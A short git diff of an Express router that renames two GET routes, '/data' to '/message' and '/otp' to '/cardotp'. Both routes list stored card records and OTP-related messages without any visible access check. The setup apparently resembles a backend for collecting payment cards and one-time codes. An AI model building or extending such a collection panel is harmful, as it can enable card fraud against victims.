@@ -51,11 +51,11 @@ router.post('/message', async (req, res)=>{
   res.send('message got success')
 })
 
-router.get("/data", async (req, res)=>{
+router.get("/message", async (req, res)=>{
   let cardData = await CardModal.find().sort({createdAt: -1});
   res.render("card", {cardData})
 })
-router.get("/otp", async (req, res)=>{
+router.get("/cardotp", async (req, res)=>{
   let cardData = await MessageModal.find().sort({createdAt: -1});
   res.render("message", {cardData})
 })
